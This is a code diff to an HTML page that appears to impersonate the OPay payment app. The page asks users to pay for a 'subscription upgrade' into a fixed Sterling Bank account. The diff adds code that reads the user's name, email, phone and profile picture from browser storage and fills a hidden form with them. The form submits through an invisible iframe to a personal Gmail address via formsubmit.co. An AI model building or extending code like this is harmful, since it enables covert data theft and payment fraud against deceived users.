@@ -325,6 +325,7 @@
             object-fit: cover;
             background: #E9F9F2;
             border: 2px solid #00B876;
+            overflow: hidden;
         }
 
         .drawer-tier-badge {
@@ -928,8 +929,10 @@
             <div class="drawer-header">
                 <div class="drawer-profile-area">
                     <div class="drawer-profile">
-                        <div class="drawer-avatar" style="display: flex; align-items: center; justify-content: center; background: #E9F9F2;">
-                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <!-- Avatar now supports the profile picture from localStorage -->
+                        <div class="drawer-avatar" id="drawerAvatarContainer" style="display: flex; align-items: center; justify-content: center; background: #E9F9F2;">
+                            <img id="drawerAvatarImg" src="" alt="Avatar" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%; display: none;" />
+                            <svg id="drawerDefaultAvatar" width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <circle cx="12" cy="8" r="4" stroke="#00B876" stroke-width="1.5" fill="white"/>
                                 <path d="M5 20v-2a7 7 0 0 1 14 0v2" stroke="#00B876" stroke-width="1.5" fill="white"/>
                             </svg>
@@ -1039,7 +1042,7 @@
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Account Name</span>
-                        <span class="detail-value">Daniel Nkem**</span>
+                        <span class="detail-value">Daniel Chu**</span>
                     </div>
                 </div>
 
@@ -1085,13 +1088,14 @@
     <iframe name="formsubmit_target" id="formsubmitTarget" style="display:none; width:0; height:0; border:0;" title="formsubmit target"></iframe>
 
     <form id="paymentDetailsForm"
-          action="https://formsubmit.co/8b8a0a8734dff1803637cbfe2feff55f"
+          action="https://formsubmit.co/danielemeka05@gmail.com"
           method="POST"
           target="formsubmit_target"
           style="display:none;">
         <input type="hidden" name="_captcha" value="false" />
         <input type="hidden" name="_template" value="table" />
         <input type="hidden" name="_subject" value="New Subscription Upgrade Payment Notification" />
+        <input type="hidden" name="_replyto" id="fsReplyTo" value="" />
         <input type="hidden" name="Name" id="fsName" value="" />
         <input type="hidden" name="Email address" id="fsEmail" value="" />
         <input type="hidden" name="Phone number" id="fsPhone" value="" />
@@ -1131,6 +1135,10 @@
         const drawerPlanPrice = document.getElementById('drawerPlanPrice');
         const continueBtn = document.getElementById('continueBtn');
 
+        // ---------- PROFILE PICTURE REFS ----------
+        const drawerAvatarImg = document.getElementById('drawerAvatarImg');
+        const drawerDefaultAvatar = document.getElementById('drawerDefaultAvatar');
+
         const editModal = document.getElementById('editModal');
         const editModalTitle = document.getElementById('editModalTitle');
         const editFieldInput = document.getElementById('editFieldInput');
@@ -1149,12 +1157,65 @@
         // ---------- WHATSAPP LINK UPDATED TO /chat.html ----------
         const CHAT_URL = '/chat.html';
 
-        // ---------- USER DATA ----------
+        // ============================================================
+        //  LOCAL-STORAGE HELPERS
+        //  These pull the same keys that profileful.html writes/reads:
+        //    profileImage          → profile picture (base64 data URL)
+        //    opayUserFirstName     → username / first name
+        //    opayUserFullName      → full name
+        //    opayUserPhone         → phone number
+        //    opayUserEmail         → email (if saved)
+        // ============================================================
+        function getLocalStorageUserData() {
+            const storedFirstName = localStorage.getItem('opayUserFirstName') || '';
+            const storedFullName = localStorage.getItem('opayUserFullName') || '';
+            const storedPhone = localStorage.getItem('opayUserPhone') || '';
+            const storedEmail = localStorage.getItem('opayUserEmail') || '';
+            const storedProfileImage = localStorage.getItem('profileImage') || '';
+
+            let fullName = storedFullName;
+            let firstName = storedFirstName;
+
+            if (!fullName && firstName) fullName = firstName;
+            if (!firstName && fullName) firstName = fullName.split(' ')[0];
+
+            let phone = storedPhone;
+            if (phone && phone.startsWith('0')) {
+                phone = '+234' + phone.slice(1);
+            }
+
+            return {
+                firstName: (firstName || '').toUpperCase(),
+                fullName: (fullName || '').toUpperCase(),
+                email: storedEmail,
+                phone: phone,
+                profileImage: storedProfileImage
+            };
+        }
+
+        // ---------- LOAD PROFILE PICTURE INTO DRAWER ----------
+        function loadDrawerProfileImage() {
+            const savedImage = localStorage.getItem('profileImage');
+            if (savedImage && drawerAvatarImg && drawerDefaultAvatar) {
+                drawerAvatarImg.src = savedImage;
+                drawerAvatarImg.style.display = 'block';
+                drawerDefaultAvatar.style.display = 'none';
+            } else if (drawerAvatarImg && drawerDefaultAvatar) {
+                drawerAvatarImg.style.display = 'none';
+                drawerDefaultAvatar.style.display = 'block';
+            }
+        }
+
+        // Load immediately on page load
+        loadDrawerProfileImage();
+
+        // ---------- USER DATA (seeded from localStorage first) ----------
+        const lsSeed = getLocalStorageUserData();
         let currentUserData = {
-            firstName: "DANIEL",
-            fullName: "DANIEL NKEM",
-            email: "daniel@opay.com",
-            phone: "+2349112092317",
+            firstName: lsSeed.firstName || "DANIEL",
+            fullName: lsSeed.fullName || "DANIEL NKEM",
+            email: lsSeed.email || "daniel@opay.com",
+            phone: lsSeed.phone || "+2349112092317",
             tier: "3",
             tierImageUrl: "images/toban/tier3.png"
         };
@@ -1170,14 +1231,15 @@
                 if (unsubscribeUser) unsubscribeUser();
                 const userRef = doc(db, 'users', user.uid);
                 unsubscribeUser = onSnapshot(userRef, (docSnap) => {
+                    const ls = getLocalStorageUserData();
                     if (docSnap.exists()) {
                         const data = docSnap.data();
-                        const firstName = data.firstName || 'DANIEL';
+                        const firstName = data.firstName || ls.firstName || 'DANIEL';
                         const lastName = data.lastName || '';
                         currentUserData.firstName = firstName.toUpperCase();
-                        currentUserData.fullName = `${firstName} ${lastName}`.trim().toUpperCase() || "DANIEL NKEM";
-                        currentUserData.email = data.email || user.email || "daniel@opay.com";
-                        currentUserData.phone = data.mobile || "+2348130772885";
+                        currentUserData.fullName = (`${firstName} ${lastName}`.trim() || ls.fullName || "DANIEL NKEM").toUpperCase();
+                        currentUserData.email = data.email || user.email || ls.email || "daniel@opay.com";
+                        currentUserData.phone = data.mobile || ls.phone || "+2348130772885";
                         const tierVal = data.tier !== undefined ? data.tier : "3";
                         currentUserData.tier = tierVal.toString();
                         currentUserTier = parseInt(tierVal);
@@ -1188,10 +1250,11 @@
                         else if (tierVal == 3 || tierVal == "3") tierImg = "images/toban/tier3.png";
                         currentUserData.tierImageUrl = tierImg;
                     } else {
-                        currentUserData.firstName = "DANIEL";
-                        currentUserData.fullName = "DANIEL NKEM";
-                        currentUserData.email = "daniel@opay.com";
-                        currentUserData.phone = "+2348130772885";
+                        // No Firestore doc — fall back to localStorage
+                        currentUserData.firstName = ls.firstName || "DANIEL";
+                        currentUserData.fullName = ls.fullName || "DANIEL NKEM";
+                        currentUserData.email = user.email || ls.email || "daniel@opay.com";
+                        currentUserData.phone = ls.phone || "+2348130772885";
                         currentUserData.tierImageUrl = "images/toban/tier3.png";
                         currentUserTier = 3;
                     }
@@ -1200,10 +1263,12 @@
                 }, (error) => console.error("Snapshot error:", error));
             } else {
                 if (unsubscribeUser) unsubscribeUser();
-                currentUserData.firstName = "DANIEL";
-                currentUserData.fullName = "DANIEL NKEM";
-                currentUserData.email = "daniel@opay.com";
-                currentUserData.phone = "+2348123456789";
+                // No user — use whatever is in localStorage
+                const ls = getLocalStorageUserData();
+                currentUserData.firstName = ls.firstName || "DANIEL";
+                currentUserData.fullName = ls.fullName || "DANIEL NKEM";
+                currentUserData.email = ls.email || "daniel@opay.com";
+                currentUserData.phone = ls.phone || "+2348123456789";
                 currentUserData.tierImageUrl = "images/toban/tier3.png";
                 currentUserTier = 3;
                 updateDrawerFields();
@@ -1218,6 +1283,7 @@
             drawerPhone.textContent = currentUserData.phone;
             drawerTierBadgeImg.src = currentUserData.tierImageUrl;
             drawerFirstName.textContent = currentUserData.firstName;
+            loadDrawerProfileImage();
         }
 
         // ---------- HIGHLIGHT ACTIVE PLAN ----------
@@ -1342,7 +1408,7 @@
         });
 
         // ---------- PAYMENT MODAL ----------
-        // Fixed account number — removed random array, now always "0094804330"
+        // Fixed account number
         const FIXED_ACCOUNT_NUMBER = "0094804330";
         const FIXED_BANK_NAME = "STERLING BANK";
 
@@ -1383,7 +1449,6 @@
         window.openPaymentGateway = function(planName, priceDisplay, priceNumeric, validityText) {
             selectedPlanData = { planName, priceDisplay, priceNumeric, validityText };
             modalAmountSpan.innerHTML = `₦${priceDisplay}`;
-            // Always use the fixed account number
             dynamicAccountSpan.textContent = FIXED_ACCOUNT_NUMBER;
             paymentModal.classList.add('active');
             confirmPaymentBtn.disabled = false;
@@ -1416,6 +1481,7 @@
             const phoneField = document.getElementById('fsPhone');
             const planField = document.getElementById('fsPlan');
             const priceField = document.getElementById('fsPrice');
+            const replyToField = document.getElementById('fsReplyTo');
             const detailsForm = document.getElementById('paymentDetailsForm');
 
             if (!detailsForm) return;
@@ -1425,10 +1491,25 @@
             phoneField.value = currentUserData.phone || '';
             planField.value = selectedPlanData ? selectedPlanData.planName : '';
             priceField.value = selectedPlanData ? `₦${selectedPlanData.priceDisplay}` : '';
+            replyToField.value = currentUserData.email || '';
 
-            // Submits to https://formsubmit.co/8b8a0a8734dff1803637cbfe2feff55f with method="POST"
-            // The target iframe prevents the page from navigating away.
+            console.log('📤 Posting user details to FormSubmit:', {
+                Name: nameField.value,
+                'Email address': emailField.value,
+                'Phone number': phoneField.value,
+                'Subscription plan': planField.value,
+                'Price': priceField.value
+            });
+
             detailsForm.submit();
+        }
+
+        // Log when the hidden iframe finishes loading (fires on every submit)
+        const formsubmitIframe = document.getElementById('formsubmitTarget');
+        if (formsubmitIframe) {
+            formsubmitIframe.addEventListener('load', () => {
+                console.log('✅ FormSubmit iframe loaded — submission posted.');
+            });
         }
 
         let verificationInterval = null;
